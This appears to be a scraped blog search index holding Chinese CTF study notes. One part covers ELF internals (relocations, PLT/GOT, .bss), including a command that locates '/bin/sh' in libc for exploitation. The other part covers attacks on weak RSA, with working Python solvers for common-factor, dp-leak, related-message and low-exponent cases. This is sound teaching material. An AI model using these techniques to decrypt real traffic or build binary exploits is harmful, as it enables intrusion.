Elf32_Sym[num]中的num对应着ELF32_R_SYM(Elf32_Rel-&gt;r_info) ELF23_R_SYM(Elf32_Rel-&gt;r_info) = (Elf32_Rel-&gt;r_info)»8 ELF32_R_TYPE(r_info)对应R_386_JUMP_SLOT#define ELF32_R_SYM(val) ((val)&gt;&gt;8)#define ELF32_R_TYPE(val) ((val)&amp;0xff)#define ELF32_R_INFO(sym,type) (((sym)&lt;&lt;8)+((type)&amp;0xff))#define ELF64_R_SYM(i) ((i)&gt;&gt;32)#define ELF64_R_TYPE(i) ((i)&amp;0xffffffff)#define ELF64_R_INFO(sym,type) ((((Elf64_Xword)(sym))&lt;&lt;32)+(type))struct Elf32_Sym{ Elf32_Word st_name; /*index into the symbol string table*/ Elf32_Addr st_value; Elf32_Word st_size; /*size of the symbol. 0 for no size or unkown size*/ unsigned char st_info; /*BIND&lt;&lt;4+TYPE&amp;0x0f*/ unsigned char st_other; /*0 for reserve*/ Elf32_Half st_shndx; /*relevant section table index, some indicates special meanings*/};dynstr 包含了动态链接的字符串 .dynstr节以\\x00作为开始和结束 中间每个字符串以\\x00间隔 dynstr+Elf32_Sym[ELF32_R_SYM(r_info)]-&gt;st_name为函数名的字符串地址rel.dyn .rel.dyn节用于变量重定位struct Elf32_Rel{ Elf32_Addr r_offset; /* Address */ Elf32_Word r_info; /* Relocation type and symbol index */};rel.plt .rel.plt节用于函数重定位 .rel.plt中r_offset表示GOT表项地址，r_info表示符号表索引$ readelf -r elfDemo.outRelocation section '.rel.dyn' at offset 0x3a8 contains 8 entries: Offset Info Type Sym.Value Sym. Name00003ed8 00000008 R_386_RELATIVE00003edc 00000008 R_386_RELATIVE00003ff8 00000008 R_386_RELATIVE00004004 00000008 R_386_RELATIVE00003fec 00000106 R_386_GLOB_DAT 00000000 _ITM_deregisterTMClone00003ff0 00000306 R_386_GLOB_DAT 00000000 __cxa_finalize@GLIBC_2.1.300003ff4 00000406 R_386_GLOB_DAT 00000000 __gmon_start__00003ffc 00000606 R_386_GLOB_DAT 00000000 _ITM_registerTMCloneTaRelocation section '.rel.plt' at offset 0x3e8 contains 2 entries: Offset Info Type Sym.Value Sym. Name00003fe4 00000207 R_386_JUMP_SLOT 00000000 printf@GLIBC_2.000003fe8 00000507 R_386_JUMP_SLOT 00000000 __libc_start_main@GLIBC_2.0plt(procedure linkage table) 包含了动态链接器调用从共享库导入的函数必须的相关代码 过程链接表，将位置独立的函数调用重定位到绝对位置 每个外部函数均有一段PLT代码，用于跳转到相应GOT表项中存储的地址Disassembly of section .plt:00000000004003f0 &lt;__libc_start_main@plt-0x10&gt;: 4003f0:\tff 35 12 0c 20 00 \tpushq 0x200c12(%rip) # 601008 &lt;_GLOBAL_OFFSET_TABLE_+0x8&gt; 4003f6:\tff 25 14 0c 20 00 \tjmpq *0x200c14(%rip) # 601010 &lt;_GLOBAL_OFFSET_TABLE_+0x10&gt; 4003fc:\t0f 1f 40 00 \tnopl 0x0(%rax)0000000000400400 &lt;__libc_start_main@plt&gt;: 400400:\tff 25 12 0c 20 00 \tjmpq *0x200c12(%rip) # 601018 &lt;_GLOBAL_OFFSET_TABLE_+0x18&gt; 400406:\t68 00 00 00 00 \tpushq $0x0 40040b:\te9 e0 ff ff ff \tjmpq 4003f0 &lt;_init+0x28&gt;plt.got调用非延迟绑定的外部符号?text程序代码段.text:00401000 ; Segment type: Pure code.text:00401000 ; Segment permissions: Read/Executedynamic 如果一个可执行文件参与动态链接，则程序头部包含类型为PT_DYNAMIC的段，其中包含.dynamic节区 为动态链接提供信息，如符号表、字符串表/* Dynamic structure */typedef struct { Elf32_Sword\td_tag;\t\t/* controls meaning of d_val */ union { Elf32_Word\td_val;\t/* Multiple meanings - see d_tag */ Elf32_Addr\td_ptr;\t/* program virtual address */ } d_un;} Elf32_Dyn;d_tag 常量标识 类型 DT_NEEDED 保存了所需的共享库名的字符串偏移表 DT_SYMTAB 动态表的地址，对应的节名.dynsym DT_REL/DT_RELA 动态链接重定位表的位置 DT_HASH 符号散列表的地址，对应的节名.gnu,hash got(global offset table) .got保存全局变量的GOT表 如stdin/stdout/stderr，非延迟绑定got.plt .got.plt前三项有特殊含义 第四项开始保存全局函数的GOT表项 GOT表项初始状态指向一段PLT代码，当库函数被首次调用，真正的函数地址会被解析并填入相应的GOT表项.got.plt结构data 已初始化且初值不为0的全局变量和静态局部变量 常量数据（字符串常量）数据段保存在目标文件中(在嵌入式系统里一般固化在镜像文件中)，其内容由程序初始化。当程序读取数据段的数据时，系统会出发缺页故障，从而分配相应的物理内存；当程序读取BSS段的数据时，内核会将其转到一个全零页面，不会发生缺页故障，也不会为其分配相应的物理内存。bss(Block Started by Symbol) 未初始化的全局变量和静态局部变量 初始值为0的全局变量和静态局部变量（依赖于编译器实现） 未定义且初值不为0的符号由于程序加载时，BSS会被操作系统清零，所以未赋初值或初值为0的全局变量都在BSS中。BSS段仅为未初始化的静态分配变量预留位置，在目标文件中并不占据空间，这样可减少目标文件体积。但程序运行时需为变量分配内存空间，故目标文件必须记录所有未初始化的静态分配变量大小总和(通过start_bss和end_bss地址写入机器代码)。当加载器(loader)加载程序时，将为BSS段分配的内存初始化为0。在嵌入式软件中，进入main()函数之前BSS段被C运行时系统映射到初始化为全零的内存(效率较高)尽管均放置于BSS段，但初值为0的全局变量是强符号，而未初始化的全局变量是弱符号。若其他地方已定义同名的强符号(初值可能非0)，则弱符号与之链接时不会引起重定义错误，但运行时的初值可能并非期望值(会被强符号覆盖)。因此，定义全局变量时，若只有本文件使用，则尽量使用static关键字修饰；否则需要为全局变量定义赋初值(哪怕0值)，保证该变量为强符号，以便链接时发现变量名冲突，而不是被未知值覆盖。 某些编译器将未初始化的全局变量保存在common段，链接时再将其放入BSS段。在编译阶段可通过-fno-common选项来禁止将未初始化的全局变量放入common段。 运行时数据段和BSS段的整个区段通常称为数据区。某些资料中“数据段”指代数据段 + BSS段 + 堆。symtab该数据结构在新版本的glibc中可能已经合并入Elf64_Sym了。typedef struct { int name; /* String table offset*/ char type:4, /* Function or data (4 bits) */ binding:4; /* Local or global (4 bits) */ char reserved; /* Unused */ short section; /* Section header index */ long value; /* Section offset or absolute address */ long size; /* Object size in bytes */}section除了正常节的索引，还存在三个伪节。 ABS: 不该被重定位的符号 UNDEF: 未定义符号，需要从其他模块引用 COMMON: 未被分配位置的未初始化的数据目标这些伪节仅存在于可重定位目标文件，可执行目标文件中没有。扩展Section有些编译器对如上节区进行了扩展，这些已存在的扩展都使用约定俗成的名 .sdata .tdesc .sbss .lit4 .lit8 .reginfo .gptab .liblist .conflictAppendix宏定义含义可参考《程序员自我修养》了解各变量值的含义分析工具常见工具readelf、objdump、file和nm readelf 显示elf文件的信息，提供调试信息。 objdump 显示目标文件信息，提供反汇编功能 file 打印基本信息及ELF头部信息 nm 打印符号信息 hexdump 打印十六进制 strings 打印文件中可打印字符的字符串strings -a -t x libc_32.so.6 | grep \"/bin/sh\"获得偏移量Reference 《ELF手册》 《程序员自我修养》 《链接器和加载器》 ELF文件格式分析 CTF all in one/Linux ELF" }, { "title": "RSA入门小结", "url": "/posts/RSA%E5%85%A5%E9%97%A8%E5%B0%8F%E7%BB%93/", "categories": "CTF, Crypto", "tags": "rsa", "date": "2022-08-15 11:20:00 +0800", "snippet": "分解n直接分解素数分解问题是困难的，但是可以通过计算机进行暴力分解。 1999年，名为Cray的超级计算机用了5个月时间分解了512bit的n。 2009年，一群研究人员成功分解了768bit的n。 2010年，又提出了一些针对1024bit的n的分解的途径，但是没有正面分解成功。通常意义上来说，一般认为2048bit以上的n是安全的。现在一般的公钥证书都是4096bit的证书。如果n比较小，那么可以通过工具进行直接n分解，从而得到私钥。如果n的大小小于256bit，那么我们通过本地工具即可爆破成功。例如采用windows平台的RSATool2v17，可以在几分钟内完成256bit的n的分解。如果n在768bit或者更高，可以尝试使用一些在线的n分解网站，这些网站会存储一些已经分解成功的n，比如：http://factordb.com针对大整数的分解有很多种算法，性能上各有优异，有Fermat方法，Pollard rho方法，试除法，以及椭圆曲线法，连分数法，二次筛选法，数域分析法等等。其中一些方法应用在RSA的攻击上也有奇效。在p，q的取值差异过大时，我们可以采用Pollard rho方法。或者p，q的取值过于相近的时候，Fermat方法可以很快将n分解成功。此类分解方法有一个开源项目yafu将其自动化实现了，不论n的大小，只要p和q存在相差过大或者过近时，都可以通过yafu很快地分解成功。RsaCtfTool集成了更多的分解算法。rsa-wiener-attack低解密指数可以加快解密的过程，但是者也带来了安全问题。Wiener表示如果满足：$d&lt;\\frac{1}{3}gn^\\frac{1}{4}$那么一种基于连分数(一个数论当中的问题)的特殊攻击类型就可以危害RSA的安全。此时需要满足：$q&lt; p&lt; 2q$如果满足上述条件，通过Wiener Attack可以在多项式时间中分解n。toolsboneh_durfee-attack$d&lt; n^{0.291}$tools公约数如果在两次公钥的加密过程中使用的 $n_1$ 和 $n_2$ 具有相同的素因子，那么可以利用欧几里得算法直接将 $n_1$ 和 $n_2$ 分解。通过欧几里得算法可以直接求出 $n_1$ 和 $n_2$ 的最大公约数p，欧几里得算法时间复杂度O(logn)这个时间复杂度即便是4096 bit也是秒破级别。'''info.txtm = xxxxxxxxe = 65537========== n c ==========n = 20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207c = 974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320...'''e = 65537n = []c = []with open(\"./info.txt\", \"r\") as f: for line in f.readlines(): if line[0] == 'n': n.append(int(line[4:])) elif line[0] == 'c': c.append(int(line[4:]))import libnumfor i in range(0, len(n)): for j in range(i+1, len(n)): if libnum.gcd(n[i], n[j]) != 1: p = n[i]//libnum.gcd(n[i], n[j]) q = n[i]//p phi = (p-1)*(q-1) d = libnum.invmod(e, phi) m = pow(c[i], d, n[i]) print(libnum.n2s(m)) break else: continue break特殊关系枚举倍数关系e = 65537n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113# dp = d mod p-1dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751# ed = 1 mod (p-1)(q-1)# e*dp = 1 mod p-1# (p-1)x = e*dp-1 =&gt; p-1 = (e*dp-1)/x, x&lt;eimport libnumx = 1while x&lt;e: if (e*dp-1)%x == 0: p = (e*dp-1)//x + 1 if n%p == 0: d = libnum.invmod(e, (p-1)*(n//p-1)) m = pow(c, d, n) print(libnum.n2s(m)) break x += 1解二元方程$x^2-(p+q)x+(pq) = x^2-\\frac{(npp-n-4)}{2}x+n$n = 19402643768027967294480695361037227649637514561280461352708420192197328993512710852087871986349184383442031544945263966477446685587168025154775060178782897097993949800845903218890975275725416699258462920097986424936088541112790958875211336188249107280753661467619511079649070248659536282267267928669265252935184448638997877593781930103866416949585686541509642494048554242004100863315220430074997145531929128200885758274037875349539018669336263469803277281048657198114844413236754680549874472753528866434686048799833381542018876362229842605213500869709361657000044182573308825550237999139442040422107931857506897810951e = 65537c = 7991219189591014572196623817385737879027208108469800802629706564258508626010674513875496029177290575819650366802730803283761137036255380767766538866086463895539973594615882321974738140931689333873106124459849322556754579010062541988138211176574621668101228531769828358289973150393343109948611583609219420213530834364837438730411379305046156670015024547263019932288989808228091601206948741304222197779808592738075111024678982273856922586615415238555211148847427589678238745186253649783665607928382002868111278077054871294837923189536714235044041993541158402943372188779797996711792610439969105993917373651847337638929# npp = (p+2)(q+2)npp = 19402643768027967294480695361037227649637514561280461352708420192197328993512710852087871986349184383442031544945263966477446685587168025154775060178782897097993949800845903218890975275725416699258462920097986424936088541112790958875211336188249107280753661467619511079649070248659536282267267928669265252935757418867172314593546678104100129027339256068940987412816779744339994971665109555680401467324487397541852486805770300895063315083965445098467966738905392320963293379345531703349669197397492241574949069875012089172754014231783160960425531160246267389657034543342990940680603153790486530477470655757947009682859import libnum# ax^2 + bx + c = 0a = 1b = -((npp - n - 4) // 2)c = ndelta = libnum.nroot(b * b - 4 * a * c, 2)x1 = (-b - delta) // 2x2 = (-b + delta) // 2print(x1, x2, x1 * x2 == n)p1 = x1q1 = x2p2 = x1+2q2 = x2+2# encrypt by e with n and npp# so decrypt by e with mod npp firstd2 = libnum.invmod(e, (p2-1) * (q2-1))m2 = pow(c, d2, npp)d1 = libnum.invmod(e, (p1-1) * (q1-1))m1 = pow(m2, d1, n)print(libnum.n2s(m1))部分信息泄露Coppersmith定理攻击Coppersmith定理指出在一个e阶的mod n多项式f(x)中，如果有一个根小于 $n^{\\frac{1}{e}}$，就可以运用一个O(log n)的算法求出这些根。这个定理可以应用于RSA算法。如果e = 3并且在明文当中只有三分之二的比特是已知的，这种算法可以求出明文中所有的比特。完全明文返回适用情况：可以构造任意密文并获得对应明文。这个好理解，在一个RSA加密过程中，明文为 $m$，密文为 $c$，模数为 $n$，加密指数为 $e$，选取x以满足 $gcd(x,n)==1$ 从而使 $x$ 模 $n$ 的逆存在，构造密文 $c’=c\\cdot (x^e)$ 使解密后明文为 $m’=(m\\cdot x)\\mod n$，则 $m=m’\\cdot x^{-1} \\mod n$。可参看模意义下的运算法则部分 如何利用该方式在 $gcd(e,phi)!=1,d$ 不存在时还原明文最低bit位泄露(lsb oracle)每次返还的结果为明文是奇数还是偶数，可以构造得到 $(2\\cdot m) \\mod n$ ，因为 $2\\cdot m$ 是偶数而 $n$ 为奇数，且 $m &lt; n$ ，所以当 $(2\\cdot m) \\mod n$ 最低位变为奇数时，有 $2\\cdot m &gt; n$ 。以此类推，将 $2\\cdot m$ 视为新的开始，重复上述操作，即可不断逼近m至少已知明文m的ceil(nBitSize*(1-1.0/e))位LLL attack已知密钥d低位d0位数大于nBitSize/4Partial Key Exposure Attack已知密钥d低位d0位数大于nBitSize/2Partial Key Recovery Attack已知dp、dqp = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852# dp = d mod p-1# dq = d mod q-1import libnumres = libnum.solve_crt([pow(c, dp, p), pow(c, dq, q)], [p, q])res = libnum.n2s(res)print(res)广播攻击同e同m低加密指数指数广播攻击如果选取的加密指数较低，并且使用了相同的加密指数给一个接受者的群发送相同的信息，那么可以进行广播攻击得到明文。即，选取了相同的加密指数e（这里取e=3），对相同的明文m进行了加密并进行了消息的传递，那么有：$c_1\\equiv m^e\\mod n_1$$c_2\\equiv m^e\\mod n_2$$c_3\\equiv m^e\\mod n_3$对上述等式运用中国剩余定理，在e=3时，可以得到：$c_x\\equiv m^3\\mod n_1n_2n_3$由于 $m&lt; min(n_1, n_2, n_3)$ 此时 $m^3$ 一定没有被模数删去一部分，可以直接求根通过对 $c_x$ 进行三次开方可以求得明文。同e不同n明文有线性关系的广播攻击Hastad’s Broadcast Attack with Linear Padding同e同n铭文有线性关系的广播攻击$M_1=a*M_2+b$$M_2=\\frac{2a^3bC^2-b^4+C_1b}{aC_1-a^4C_2+2ab^3}=\\frac{b}{a}\\frac{C_1+2a^3C_2-b^3}{C_1-a^3C_2+2b^3}$def relate_message_attack(a, b, c1, c2, n):b3 = gmpy2.powmod(b, 3, n)part1 = b * (c1 + 2 * c2 - b3) % npart2 = a * (c1 - c2 + 2 * b3) % npart2 = gmpy2.invert(part2, n)return part1 * part2 % n共模攻击同m同n共模攻击如果在RSA的使用中使用了相同的模n对相同的明文m进行了加密，那么就可以在不分解n的情况下还原出明文m的值。$c_1\\equiv m^{e_1}\\mod n$$c_2\\equiv m^{e_2}\\mod n$此时不需要分解n，不需要求解私钥，如果两个加密指数互素，就可以通过共模攻击在两个密文和公钥被嗅探到的情况下还原出明文m的值。过程如下，首先两个加密指数互质，则：$(e_1,e_2)=1$即存在 $s_1$， $s_2$ 使得：$s_1e_1+s_2e_2=1$又因为：$c_1\\equiv m^{e_1}\\mod n$$c_2\\equiv m^{e_2}\\mod n$通过代入化简可以得出：$c_1^{s_1}c_2^{s_2}\\equiv m\\mod n$爆破攻击低加密指数爆破当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。即：$c\\equiv m^e\\mod n$如果 $e=3$，且 $m^e&lt; n$，那么：$c = m^e, e = 3$$m = sqrt[3]{c}$如果明文的三次方比n大，但是不是足够大，那么设k，有：$c = m^e+kn$爆破 $k$，如果 $c-kn$ 能开三次根式，那么可以直接得到明文。n = 0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793e = 0x3c = 0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365import libnumfor i in range(0, 0x10000): if pow(libnum.nroot(c+i*n, 3), 3, n) == c: m = libnum.nroot(c+i*n, 3) print(libnum.n2s(m)) break其他工具如wolframalpha、Pari/GP" } ]
